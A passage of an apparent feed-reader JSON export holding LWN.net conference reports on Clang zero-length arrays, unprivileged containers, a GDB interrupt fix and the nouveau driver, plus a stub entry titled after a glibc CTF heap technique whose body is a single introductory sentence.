flexible arrays seems pointless within\nthat community, Cook said.\n</p>\n\n<p>\n\"Unfortunately, that's not the reality of our world.\"  When the GNU\nextension was added, some code used zero-length arrays as flexible arrays,\nwhile other code used them as actual arrays with no elements in order to place\nmarkers inside structures, for example.  In addition, there are arrays in\nthe kernel that typically have some fixed size but that size may fall to\nzero in certain configurations.  \n</p>\n\n<p>\nThere are probably ways to work around the\nlack of that option for Clang, Cook said, but it would be much easier for\nthe Clang developers to\naccept the reality that zero-length arrays exist and that the kernel (at\nleast) wants to be able to stop treating them as flexible arrays.  There is\na flag available to warn on the use of zero-length arrays, but it produces\n60,000 warnings on the kernel code, so that is not a sensible path either,\nSilva said. It is clear that the hope is for the Clang folks to relent on\nthis particular point.\n</p>\n\n<p>\n[ I would like to thank LWN subscribers for supporting my travel to Dublin\nfor the Linux Security Summit Europe. ]<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/ConferenceIndex/\">Conference</a></td><td><a href=\"https://lwn.net/Archives/ConferenceIndex/#Linux_Security_Summit_Europe-2022\">Linux Security Summit Europe/2022</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "909627",
    "timestampUsec": "1664405033880984",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Progress for unprivileged containers",
    "author": ";jake",
    "published": 1664400900,
    "updated": 1664400900,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/909627/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jake Edge</b><br>September 28, 2022\n           <hr>\n<a href=\"https://lwn.net/Archives/ConferenceByYear/#2022-Linux_Security_Summit_Europe\">LSS EU</a>\n</div>\n<p>\nOver the past few years, there has been quite a bit of progress in various\nkernel features that can be used to create containers without requiring\nprivileges.  Most of the containers these days run as root, which\nmeans that a vulnerability leading to an escape from the container can\nresult in system compromise.  Stéphane Graber gave a talk at the 2022 <a href=\"https://events.linuxfoundation.org/linux-security-summit-europe/\">Linux\nSecurity Summit Europe</a> (LSS EU) to fill in some of the details of work\nthat he and others have been doing to run containers as unprivileged code.\n</p>\n\n<p>\nThe talk was slated to have two speakers, as Christian Brauner had planned\nto co-present; unfortunately, Brauner got caught up in the travel woes that\nplagued Dublin around the time of the conference and was at the airport\nwaiting for his\nplane home at the time of the talk.  The presentation was something of a\nfollow-up \nto their \n<a href=\"https://lwn.net/Articles/899281/\">talk on system-call interception for\nunprivileged containers</a> at\nLSS North America back in June.  Graber is the project lead for the <a href=\"https://linuxcontainers.org/\">LXC</a> and <a href=\"https://linuxcontainers.org/lxd/introduction/\">LXD</a> container\nprojects, which we recently <a href=\"https://lwn.net/Articles/907613/\">looked at</a>;\nBrauner is a kernel developer and one of the LXC/LXD maintainers.\n</p>\n\n<h4>User namespaces</h4>\n\n<p>\nThe title of the talk was \"What's new in the user namespace\", but the\ncontent was a fair bit more wide-ranging.  Graber began with a quick\nintroduction to <a href=\"https://lwn.net/Articles/532593/\">user namespaces</a>, which were\nadded to the kernel in 2013 by Eric Biederman; they are \"getting fairly\nclose to a decade old at this point\". In a nutshell, a user namespace\nallows a process and its descendants to map user IDs (UIDs) and group IDs\n(GIDs) inside \nthe namespace to different values in the real\nLinux system hosting the namespace (i.e. the \"root namespace\").  So a\nnamespace can have a UID 0, thus look and act like the\nroot user inside the namespace, which is actually mapped to an\nunprivileged ID on the system.\n</p>\n\n<a href=\"https://lwn.net/Articles/909759/\">\n<img src=\"https://static.lwn.net/images/2022/lsseu-graber-sm.png\" border=\"0\" hspace=\"5\" align=\"right\" alt=\"[Stéphane Graber]\" title=\"Stéphane Graber\" width=\"202\" height=\"280\">\n</a>\n\n<p>\nRegular users can create their own user namespace and map their own UID/GID\nto the root user inside the namespace; anything more complicated requires\nthe use of a privileged helper program to map ranges of IDs for the\nnamespace.  This is analogous to a <a href=\"https://lwn.net/Articles/580893/\">network\nnamespace</a>, he said, which has no network devices when it is created\nand needs a privileged helper to create (most)\nnetwork devices inside the unprivileged network namespace.  He did a quick\ndemo showing the creation of user namespace with the <a href=\"https://man7.org/linux/man-pages/man1/unshare.1.html\"><tt>unshare</tt></a>\ncommand, which used the <tt>-r</tt> option to map his UID to root inside of\nthe namespace.\n</p>\n\n<p>\nNormally, though, a container will need more than the single-ID mapping as\nin that example.  POSIX really wants to have 64K UIDs and GIDs available to\nit and there needs to be a \"nobody\" user and \"nogroup\" group so that things\nwork as expected; it is\nusual to map a \nwhole range of 64K IDs into a user namespace, he said.  In addition,\ncontainers will likely want additional namespaces, including <a href=\"https://lwn.net/Articles/689856/\">mount</a>, <a href=\"https://lwn.net/Articles/531419/\">process\nID</a> (PID), <a href=\"https://lwn.net/Articles/531381/\">UTS</a> (mostly for a separate\nhostname), network, and <a href=\"https://lwn.net/Articles/621006/\">control group</a>\n(cgroup) namespaces.  Some mixing and matching of namespace types may make\nsense, depending on the use case for the container.\n</p>\n\n<p>\nAs noted, by using a privileged helper (or, of course, setting up the\nnamespaces as root) the user namespace can be made to map many IDs, up to\nthe entirety \nof the host system's ID range.  A namespace could be created that\neffectively has no map because it maps every host ID to an ID in the\nnamespace, but that is not a \ngood idea. \"You should never ever map the real UID 0 to anything\"\ninside a user namespace.\n</p>\n\n<p>\nThe UID 0 inside of a namespace looks like it has all of the\nprivileges of the root user, but that is not really true, of course, at\nleast with respect to the host system.  All\nof the Linux capabilities will be granted to that root user inside the\nnamespace, for example, \nbut they are not effective for the host system.  The <tt>is_capable()</tt>\nkernel capabilities check will only use the host-mapped UID to determine\ncapabilities; the <tt>is_ns_capable()</tt> will instead report the\ncapabilities as seen within the namespace.\n</p>\n\n<p>\nIf there are going to be multiple containers running on the same host, it\nprovides better security to map each to its own set of 64K IDs, he said.\nThat way, \nif there are resource constraints being applied to a specific host ID,\na container cannot cause a denial of service for a different container that\nis sharing that host ID.  Graber demonstrated creating two containers with\nnon-overlapping IDs using LXC.\n</p>\n\n<h4>Filesystem woes</h4>\n\n<p>\nWhile the IDs are mapped inside of the namespace, the filesystem has a\nrather different view of things; it uses the host IDs both for permission\nchecking and for writing IDs for file ownership.  This is a longstanding\nproblem for user namespaces with real (rather than virtual) filesystems.\nSome filesystems, such as tmpfs or FUSE, that are mounted inside a\nmount and user namespace combination do actually use the mapped IDs, but\nthere is still a problem accessing existing filesystems written with\ndifferent IDs.   Sharing filesystems among multiple containers is also\ndifficult. \n</p>\n\n<p>\nThe first attempt to fix the problem was <a href=\"https://lwn.net/Articles/718639/\">shiftfs</a> (\"occasionally we forget the 'f', the\nfirst one\", he said with a grin).  It was created by James Bottomley and\nthen picked up by Graber's team at Canonical; it was not merged for the\nmainline but it still ships in some Ubuntu\nversions because the mainline solution (next up in the talk) is\nnot available for all filesystems \nof interest yet. Shiftfs functions much like an <a href=\"https://lwn.net/Articles/542707/\">overlay filesystem</a> that allows remapping of\nUIDs and GIDs.  It has a number of problems, he said, especially in handling\nfilesystem-specific <tt>ioctl()</tt> commands and  in its\ninteractions with various virtual-filesystem (VFS) layer caches; those\nproblems clearly show that the shiftfs approach was \"not the right way to\ndo it\". \n</p>\n\n<p>\nThe proper way to fix this problem is with  <a href=\"https://lwn.net/Articles/896255/\">ID-mapped mounts</a>, which was developed by\nBrauner, Graber said.  Most of the feature is implemented in the VFS layer,\nbut individual filesystems do need to change to support it; currently,\next4, XFS, Btrfs, VFAT, F2FS, overlayfs, and probably a few other\nfilesystems support \nit.  ZFS and Ceph are both pending as well, but there is no support for any\nnetwork filesystems at this point.  ID-mapped mounts solve the problem\ncleanly, at the VFS layer, so the edge cases where shiftfs had trouble are\nsmoothly handled.\n</p>\n\n<h4>New namespaces</h4>\n\n<p>\nGraber said that he had spent the previous few days at the Linux Plumbers\nConference (LPC) and in its Kernel Summit track; he learned some more about\nupcoming new namespaces.  There is a trend that new namespaces not be\ndeveloped as \nfull-blown namespaces with their own flag to <a href=\"https://man7.org/linux/man-pages/man2/clone.2.html\"><tt>clone()</tt></a>, but to hang\nthem off of the user namespace instead.  They become features that can be\nenabled for a given user namespace, which is simpler to implement and use,\nhe said. \n</p>\n\n<p>\nThe first of those is the <a href=\"https://sourceforge.net/p/linux-ima/wiki/Home/\">Integrity Measurement\nArchitecture</a> (IMA) namespace, which has been a work in progress for\nsome time now; <a href=\"https://lwn.net/ml/linux-kernel/20220915193221.1728029-1-stefanb@linux.ibm.com/\">version 14\nof its patch set</a> was posted the morning of the talk. It will allow IMA to\nbe used within containers, so that every file that is used in the container\ncan be measured\nto ensure its integrity. \nDifferent namespaces can then have different IMA policies as well. \n</p>\n\n<p>\nThe other new namespace is the tracing namespace that was described by\nMathieu Desnoyers at LPC, Graber said.  It will allow running some of the\ntracing tooling inside of containers, which will be pretty useful but will\nbe \"interesting\" to implement.  It will be difficult to make it safe to\nuse, so it is the kind of feature that will\nlikely need to grow over time; some simple things will be allowed at the\nbeginning and others will be added slowly.\n</p>\n\n<p>\nShifting gears again, Graber said that there are questions in the community\nabout how to restrict the user namespace feature. It has been around for\nnearly a decade and the bugs that have been found of late are not in the\nuser namespace code, rather they are elsewhere in the kernel and were only\nexposed by the feature, but it is\nstill an increase in the attack surface.  So people are looking for ways to\nrestrict its use.\n</p>\n\n<p>\nThere is the \"big hammer\" of not compiling the feature into the kernel, but\nthat is not really viable these days since more and more applications are\nusing user namespaces.  There are resource limits that can be placed on the\nnumber of user namespaces that can be created, but it is a system-wide\nsetting, not per-user or per-process.  Similarly, a <a href=\"https://man7.org/linux/man-pages/man2/seccomp.2.html\"><tt>seccomp()</tt></a>\nfilter \ncould be used to restrict the system calls that can be made, but\n<tt>seccomp()</tt> cannot filter based on the pointer arguments to\n<tt>clone3()</tt> \nso that technique is not really workable either.  Various distributions\nhave added their own control via <tt>sysctl</tt> but those are not in the\nmainline. \n</p>\n\n<p>\nThere has been some <a href=\"https://lwn.net/Articles/903580/\">work to add a\nsecurity-module hook</a> for user-namespace creation, which would give\nSELinux and other modules a way to pass judgment on the\noperation.  That approach makes\nsense to the Linux security\nmodule (LSM) community and others, but Biederman, who is the namespace\nmaintainer, does not agree. He does not want to see more restrictions added\nfor user namespaces, but perhaps he can be convinced, Graber said, or a\nmore generic mechanism can pass muster.  He would like to see distributions\nand others have more fine-grained control over the use of user namespaces\nso he hopes the problem will get resolved soon.\n</p>\n\n<p>\nHe spent a bit of time going over the system-call interception work that he\nand Brauner presented at LSS NA.  The general idea is that they have a\nprivileged process that mediates privileged system \ncalls for containers by way of <tt>seccomp()</tt>.  Some of the operations\nthey would like to enable \nthat way sound \"scary\", like kernel-module and BPF-program loading, or\nmounting filesystems, but the intent is to only perform those operations on\ntrusted resources.\n</p>\n\n<p>\nA trusted resource is one that the host system trusts because it knows that\nthe contents have not been modified by untrusted users.  For example, a\nspecific netfilter kernel module might be requested by a container, so\nthe container manager would inspect the module to see that it is one of the\ntrusted ones. The module that gets passed by the container \"would\nabsolutely not be loaded\", but the manager could load the host's copy of the\nmodule that the container has requested if it is on a list of trusted modules.\n</p>\n\n<p>\nIn conclusion, Graber said that the introduction ID-mapped mounts is a\n\"game changer\" for the adoption of user name spaces and containers.  For\nyears, the lack of that feature has meant that Docker and Kubernetes\ncontainers generally have to be privileged containers; since those make up\nthe vast majority of containers, the use of unprivileged containers has\nbeen tiny.  But as the ID-mapped mounts feature becomes available, the\nproblems for IDs on \nDocker-style layered filesystems will fade, so there is hope for more\nunprivileged container use down the road.  \"Maybe in another decade more, no\none will use privileged containers anymore ... maybe\".\n</p>\n\n<p>\nHe also thinks that the new model for namespaces that are part of the user\nnamespace makes a lot of sense.  It helps reduce the review burden and\nshould allow for more interesting namespaces to be added.  The\n<tt>seccomp()</tt> system-call interception is exciting as well, since it\nwill allow working around some of the limitations that exist for\nunprivileged containers.  The future is bright it would seem.\n</p>\n\n<p>\n[I would like to thank LWN subscribers for supporting my travel to Dublin\nfor the Linux Security Summit Europe.]<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Security/Index/\">Security</a></td><td><a href=\"https://lwn.net/Security/Index/#Containers\">Containers</a></td></tr>\n            <tr><td><a href=\"https://lwn.net/Archives/ConferenceIndex/\">Conference</a></td><td><a href=\"https://lwn.net/Archives/ConferenceIndex/#Linux_Security_Summit_Europe-2022\">Linux Security Summit Europe/2022</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://tttang.com/archive/1749/",
    "timestampUsec": "1664415853893301",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "glibc2.35后门执行研究:tls_dtor_list攻击劫持exit执行流程",
    "author": ";dreamcat",
    "published": 1664414880,
    "updated": 1664414880,
    "alternate": [
        {
            "href": "https://tttang.com/archive/1749/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>从今年4月份开始，慢慢接触高版本的glibc，高版本glibc的堆题也使得国内ctf比赛进入到一个新的时期</p>"
    },
    "origin": {
        "streamId": 45,
        "title": "跳跳糖 - 安全与分享社区",
        "htmlUrl": "https://tttang.com/",
        "feedUrl": "https://tttang.com/rss.xml"
    }
},
{
    "id": "909496",
    "timestampUsec": "1664480606660917",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "How to fix an ancient GDB problem",
    "author": ";corbet",
    "published": 1664480220,
    "updated": 1664480220,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/909496/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>September 29, 2022\n           <hr>\n<a href=\"https://lwn.net/Archives/ConferenceByYear/#2022-GNU_Tools_Cauldron\">Cauldron</a>\n</div>\nThe <a href=\"https://www.sourceware.org/gdb/\">GDB debugger</a> has a long\nhistory; it was first created in 1986.  It may thus be\nunsurprising that some GDB development happens over relatively long time\nframes but, even when taking that into account, the existence of an open\nbug first <a href=\"https://sourceware.org/bugzilla/show_bug.cgi?id=9425\">reported</a> in\n2007 may be a little surprising.  At the <a href=\"https://gcc.gnu.org/wiki/cauldron2022\">2022 GNU Tools Cauldron</a>,\nGDB maintainer Pedro Alves talked about why this problem has been difficult\nto solve, and what the eventual solution looks like.\n<p>\nThe problem in question, Alves said, has to do with the handling of\nkeyboard interrupts, which normally result from the user hitting control-C.\nThe user's normal expectation is that an interrupt within GDB while the target\nprogram is running will stop the program and return the GDB prompt.  If,\nhowever, that program has blocked the <tt>SIGINT</tt> signal, the interrupt\nwill never be delivered.  At best, GDB will not stop; at worst, the entire\ndebugging session can become stuck and need to be killed from another\nterminal.  GDB users, it seems, tend not to like that behavior.\n</p><p>\nThis problem results from how GDB handles both terminals and interrupt\nsignals.  A \"session\", in the Unix sense, is a set of process groups, all\nof which share a single controlling terminal.\nNormally, the debugged process runs in the same session as — and shares the\nterminal with — GDB, but GDB puts that process into a different process group.\nMultiple process groups can share a terminal, but only one of those — the\nforeground group — will receive signals generated by the user at that\nterminal.  GDB normally runs as the foreground group but, when it runs the\ntarget program, it designates that program's group as the foreground group\ninstead.\n</p><p>\n<a href=\"https://lwn.net/Articles/909503/\"><img src=\"https://static.lwn.net/images/conf/2022/cauldron/PedroAlves-sm.png\" alt=\"[Pedro Alves]\" title=\"Pedro Alves\"></a>\n\nNormally, if the target process receives a <tt>SIGINT</tt> signal, it will\nbe intercepted by GDB; that happens as part of how tracing with <a href=\"https://man7.org/linux/man-pages/man2/ptrace.2.html\"><tt>ptrace()</tt></a>\nworks.  GDB will respond by stopping the target program and putting out a\nprompt; the signal is never actually delivered to that program.  If,\nhowever, the program has blocked <tt>SIGINT</tt> then the signal remains\npending; since it is never delivered, <tt>ptrace()</tt> has nothing to\nintercept.  That can result in everything getting stuck.  There are other\npaths to the same situation; <a href=\"https://man7.org/linux/man-pages/man3/sigwait.3.html\"><tt>sigwait()</tt></a>\ncalls, for example, can consume pending signals in a way that causes them\nto never actually be delivered.\n</p><p>\nThe solution, Alves said, is the same as for any other problem in computer\nscience: add another layer of indirection.  In this case, that layer takes\nthe form of a pseudo-terminal (PTY) that is given to the target process\nrather than the real controlling terminal.  GDB then acts as an\nintermediary between the two terminals.  Any output written by the target\nprogram to the PTY is simply copied to the real terminal.  Input is a bit\ntrickier, since the target can have changed the terminal's modes; GDB has\nto put the real terminal into raw mode, then copy all of the input from the\nreal terminal into the PTY.  When the target is not running, the terminal\nis put back into \"readline mode\" for interaction with GDB.\n</p><p>\nNow, the target can do anything it wants with <tt>SIGINT</tt> without\naffecting GDB, which, as the foreground process on the real terminal, can\nhandle events directly.  Since that terminal is in raw mode, that means\nrecognizing the interrupt character and responding accordingly.  There are\nother advantages as well; since GDB remains in control of when output goes\nto the (real) terminal, it can avoid intermixing its own output with that\nfrom the target.  Another advantage is that GDB is now able to preserve the\nuser's thread selection (the specific thread that debugging activity is\nfocused on) after an interrupt; this wasn't possible before.\n</p><p>\nThere is, he said, an \"escape hatch\" for anybody wanting the previous\nbehavior; it needs to be there to support other Unix systems in any case.\n</p><p>\nThere were a few other remaining problems, he said.  The first process in\nthe foreground \nprocess group is considered the \"session leader\" by the kernel; if that\nprocess exits, then its children will be sent a <tt>SIGHUP</tt> signal.\nMost applications are not prepared for that and will be killed as a result.\nNow that the target has its own terminal, it becomes the session leader\nonce it starts.  If that process forks and exits, its child processes are\nlikely to meet an untimely end — not the debugging experience that the user\nis likely to have had in mind.\n</p><p>\nThe solution in this case is a variation on the\ndouble-fork technique; before launching the target, GDB will fork twice,\nwith the first process doing nothing but waiting.  It will become the\nsession leader; since it doesn't exit, no <tt>SIGHUP</tt> signals will be\ngenerated if the target does surprising things.\n</p><p>\nGDB still has to be able to stop programs that block <tt>SIGINT</tt>; for\nobvious reasons, it cannot use <tt>SIGINT</tt> for that purpose.  The\nsolution here, he said, is to use <tt>SIGSTOP</tt>, which cannot be\nblocked, instead.\n</p><p>\nAs is often the case, Emacs users present their own special challenges.\nEmacs uses control-C for its own purposes, and remaps <tt>SIGINT</tt> to\ncontrol-G instead.  In cases like this, the user almost certainly wants\ncontrol-C to be passed through to the target.  The answer is a GDB command\nthat allows the user to specify which key should interrupt the process and\nreturn to the GDB prompt.\n\n</p><p>\nThis patch was first prototyped in 2019, but didn't make it to the GDB list\nuntil 2021.  There were a few problems that turned up at that point,\nincluding the session-leader difficulty.  Those have all been resolved, and\nAlves intends to post the patch set again sometime soon.  His objective, he\nconcluded, is to post it at least once per year until the problem is\nfinally solved.\n</p><p>\n[Thanks to LWN subscribers for supporting my travel to this event.]<br clear=\"all\"></p><div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "910343",
    "timestampUsec": "1665004418890122",
    "categories": [
        "user/-/state/com.google/unread",
        "user/-/state/com.google/starred"
    ],
    "title": "NVIDIA and nouveau",
    "author": ";jake",
    "published": 1665003660,
    "updated": 1665003660,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/910343/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jake Edge</b><br>October 5, 2022\n           <hr>\n<a href=\"https://lwn.net/Archives/ConferenceByYear/#2022-Linux_Plumbers_Conference\">LPC</a>\n</div>\n<p>\nThe <a href=\"https://lwn.net/Articles/894861/\">release of source code</a> for NVIDIA\ngraphics hardware was perhaps something of a surprise; at least at a quick\nglance, it seems\nlike that could lead to an in-tree, officially supported driver.  For many\nyears, though, the <a href=\"https://nouveau.freedesktop.org/\">nouveau\nproject</a> has been working on an upstream driver for NVIDIA hardware, so an\nobvious question is what happens with nouveau in light of the NVIDIA\nannouncement.  Kernel graphics maintainer Dave Airlie gave a talk at the\n2022 <a href=\"https://lpc.events/\">Linux Plumbers Conference</a> (LPC) to\nhelp shed some light on that subject.\n</p>\n\n<h4>NVIDIA</h4>\n\n<p>\nHe began by giving a brief history of NVIDIA hardware, with a timeline that\ncan be seen in his <a href=\"https://lpc.events/event/16/contributions/1202/attachments/992/1919/nouveau%20in%20the%20times%20of%20firmware.pdf\">slides</a>. The\ntimeline was in part \"cobbled together from Wikipedia\" and is not\ncompletely accurate, he said, but shows just \"how far back NVIDIA hardware\nstretches\".   While the timeline starts in 1999, things started getting\ninteresting in 2006 with the NV50, he said. It introduced the per-context\nvirtual \nmemory addresses; that feature represented a major turning point for graphics\nhardware. \n</p>\n\n<a href=\"https://lwn.net/Articles/910360/\">\n<img src=\"https://static.lwn.net/images/2022/lpc-airlie-sm.png\" border=\"0\" hspace=\"5\" align=\"left\" alt=\"[Dave Airlie]\" title=\"Dave Airlie\" width=\"189\" height=\"280\">\n</a>\n\n<p>\nThere is roughly a two-year cadence to the NVIDIA releases starting in 2010\nwith \"Fermi\" (GF1xx). <a href=\"https://www.vulkan.org/\">Vulkan</a> support\nwas added in the \"Kepler\" (GK1xx) \nhardware in 2012.  In 2014, \"Maxwell\" came in two versions (GM1xx\nand GM2xx); the latter, also known as \"Maxwell 2\", introduced signed\nfirmware.  That pace more or less continued with \"Pascal\" (GP1xx) in 2016,\n\"Volta\" (GV1xx) in 2017, \"Turing\" (TU1xx) in 2018, and \"Ampere\" (GA1xx) in\n2020.  Turing brought support for the GPU system processor (GSP); he\nexplained the importance of that feature a bit later in\nthe talk. \n</p>\n\n<p>\nStarting with Maxwell 2, NVIDIA decided that firmware for its devices could\nnot simply be loaded unsigned, for security and other reasons.\nSo firmware needed to be signed by NVIDIA and loaded into the multiple\nprocessors on the device.  This made life hard for the nouveau project\nbecause it required complicated boot sequences for poking multiple firmware\nimages into the device in a specific order that was \"very hard to get\nright\".  \n</p>\n\n<p>\nNVIDIA and nouveau had worked out an arrangement where NVIDIA would provide\nsigned firmware, but it was still difficult to get any of the hardware\nworking.  Even when \nall of the right things were done at boot time, the devices came up in\ntheir base configuration.  The devices were powered-on and functioning, but\n\"you can't make it \nreclock, you can't make it go faster\".  Manually choosing a performance\nlevel for NVIDIA devices is known as \"reclocking\".   There was also no\npower-management \nfunctionality available to the driver. This was a watershed moment for\nnouveau, Airlie said, because it did not make sense to put a lot of effort\ninto a driver for graphics hardware running in its slowest possible mode,\nwhile not being battery-friendly either.\n</p>\n\n<p>\nThe GSP is a RISC-V-based processor that was added to the GPU for the\nTuring and later hardware.  The GPU already had \"six or seven little processors\non it\", but the GSP is meant to be \"the one to rule them all\".  The\nfirmware file for the GSP is around 30 or 40MB; most of the earlier\nfirmware blobs were on the order 256KB, so the GSP is a substantial\nincrease in size.  But it is a single firmware image for the device that\ninitializes the rest of the processors.  Effectively, NVIDIA moved much of\nits proprietary kernel \ndriver \ninto the GSP.\n</p>\n\n<p>\nThat all happened around the same time as the announcement of the\nopen-source NVIDIA kernel drivers, he said.  Those are based on a fork of\nthe NVIDIA \nproprietary driver that only interfaces directly to the GSP; it turns out that\nthere is nothing all that interesting in the API between the kernel and the\nGSP, so it could be released as open source.  Since NVIDIA has customers\nwho are interested in open-source drivers, it makes sense for the company\nto do so. \nHowever, the drivers do not look or act like the existing kernel graphics\ndrivers so they are not able to go into the upstream kernel, Airlie said.\n</p>\n\n<h4>nouveau</h4>\n\n<p>\nThat is the current state in the NVIDIA world, which made for a good lead-in\nto talk about nouveau.  That project started in around 2007 to\nreverse-engineer NVIDIA GPUs to create Linux drivers.  It supports hardware\nfrom NV04 (1999) through Ampere \"in various states of disrepair\". \n</p>\n\n<p>\nBut the project has stagnated some recently due to various factors. One big\nproblem that a community, open-source graphics project faces is that once\nsomeone gets good at working on it, that becomes known, and they get hired\naway to work on some other graphics hardware.  There is really only one\nfull-time nouveau developer, Ben Skeggs at Red Hat, working on the\nproject.\n</p>  \n\n<p>\nAlso, once the signed firmware came about, with its lack of reclocking and\npower-management features, it was disheartening for the project; there was\nno way that the open-source driver was ever going to be able to compete\nwith the proprietary one.  It was hard to justify putting in a lot of\neffort into nouveau.  Beyond that, Skeggs spent a lot of time just trying\nto get the \nfirmware provided by NVIDIA to load and run the hardware.\n</p>\n\n<p>\nFor the most part, the nouveau kernel driver is just for hardware\nenablement at this point.  The firmware that NVIDIA provides is not the\nsame as what is used by the proprietary driver, so it is not well-tested.\nOnly NVIDIA can really debug problems with that firmware, so there have to\nbe multiple round-trips with NVIDIA engineers.  More recently, though, the\nproject has been adding GSP support because that provides a high-level\ninterface to things like reclocking, so the hope is that the nouveau kernel\ndriver \ncan use the standard NVIDIA GSP firmware and drive the hardware that way;\n\"we will see\".\n</p>\n\n<h4>OpenGL and Vulkan</h4>\n\n<p>\nThere is a nouveau <a href=\"https://www.opengl.org/\">OpenGL</a> driver in\n<a href=\"https://www.mesa3d.org/\">Mesa</a>.  He believes it has passed the\nOpenGL 4.5 conformance tests, but has never been submitted for\ncertification.  Up until recently, it had \"horribly broken multithreading \ncontext support\" so it worked for older single-threaded games and the like\nbut not for programs like Firefox or modern games; that has been fixed\nrecently, though.  The driver has not seen\na lot of optimization work, however, due to the lack of reclocking support\nfor the \nhardware. \n</p>\n\n<p>\nA Vulkan driver for nouveau was recently started by Jason Ekstrand, with\nhelp from Karol Herbst and Airlie.  At\nthe time of the talk, that was a bit of news, but things have <a href=\"https://lwn.net/Articles/910319/\">progressed</a> since that time.  The driver is\ntargeting \nVulkan 1.0 for hardware from Kepler up through Ampere and is passing\nlots of the conformance tests at this point.  But in order to finish the\ndriver, and make it work the way they want it to, there is a need to add\nnew user-space APIs to the kernel.\n</p>\n\n<p>\nThere are three features needed to get Vulkan really working, he said.  The\nfirst is \nto split the physical memory allocations (for buffer objects) from the GPU\nvirtual memory allocations.  In nouveau, that's all done in one step, which\nis fine for OpenGL but does not work for Vulkan where more control over\nthe mappings is required.\n</p>\n\n<p>\nThe second is that synchronization objects and ways to handle and work with\nthem need to be\nadded so that \nthe scheduler can wait for existing GPU work to complete before sending new\ntasks.  It is the way to do proper interleaving of GPU work,\nAirlie said.   The final piece is a virtual-memory-handling\ninterface that is called VM_BIND; it is something that is being looked at\nfor the Intel driver and the amdgpu driver already has many of pieces of\nit.  It is \nan API both for virtual memory and for command submission that is also\ngeared toward the needs of Vulkan.\n</p>\n\n<p>\nThose are all non-trivial projects, he said.  Once the GSP support is\nworking and reclocking can be done, these are the next steps for nouveau,\nbut they are going to take some time.  The Vulkan driver developers have already\nstarted looking at \nthat effort, but there are somewhat circular dependencies that make it\ndifficult to \nsee how to do the work incrementally.  It will be a lot of code to review,\nso getting it into the upstream kernel in a piece-wise fashion will be\nchallenging. \n</p>\n\n<h4>Future</h4>\n\n<p>\nThere are some upcoming problems that have not yet been faced, he said.  A\n30 or 40MB firmware image is rather large; normally, those are put into the\ninitramfs.  But putting multiple initramfs images into the boot partition\nmay overrun the space available.  The problem gets worse because there may\nbe a need to ship multiple NVIDIA firmware images due to a lack of a\nstable firmware ABI. The nouveau project will have to pick and choose which\nfirmware versions to support, but each will need to be available; he has\nwondered if there might be a way to delay firmware loading until after the\nreal root filesystem is mounted, but has not really worked that out yet.\n</p>\n\n<p>\nIn the long run, it may not really make sense to pound the NVIDIA firmware\nAPI into the \nnouveau driver, which has its own ideas about how everything works.  A new\ndriver that leaves behind the existing nouveau legacy and only talks to the\nGSP using NVIDIA's API may be the right path instead.  \nIn addition, the ability to\nreclock the hardware and accelerate the GPU may allow creating\na cross-platform compute stack, to replace the vendor-specific\nsolutions (e.g. <a href=\"https://developer.nvidia.com/cuda-toolkit\">CUDA</a>) that exist\ntoday.  All of those solutions are on their own island, lacking any real\ndeveloper \ncommunity, but maybe that could be changed; \"we've done it for Vulkan,\nwe've done it for OpenGL, I don't see why we can't do it\", though it will\ntake a lot of time—and likely a lot of money.\n</p>\n\n<p>\nAn audience member asked about <a href=\"https://vkguide.dev/docs/gpudriven/compute_shaders/\">Vulkan\nCompute</a> as a possibility, but Airlie said it was not geared toward the\nsame kinds of problems as CUDA and others.  It is better than <a href=\"https://www.khronos.org/opengl/wiki/Compute_Shader\">OpenGL\nCompute</a>, but is still a long way from what the real compute stacks\nprovide.  Ekstrand echoed that, noting that there while there is desire to\nsee Vulkan Compute handle more of the \"scientific\" computing use cases, it\nwill never be a full-stack solution; at most Vulkan can provide the\nrun-time piece, he said.\n</p>\n\n<p>\nThere was some discussion of the problem with the size of the GSP firmware\nand initramfs that Airlie had described, including several suggestions of\nways to approach the problem.  The <a href=\"https://youtu.be/KkOdMwZRpYY?t=30726\">YouTube video</a> of the talk\nis available for those who are interested in that discussion or more of the\ndetails elsewhere in the talk.\n</p>\n\n<p>\n[I 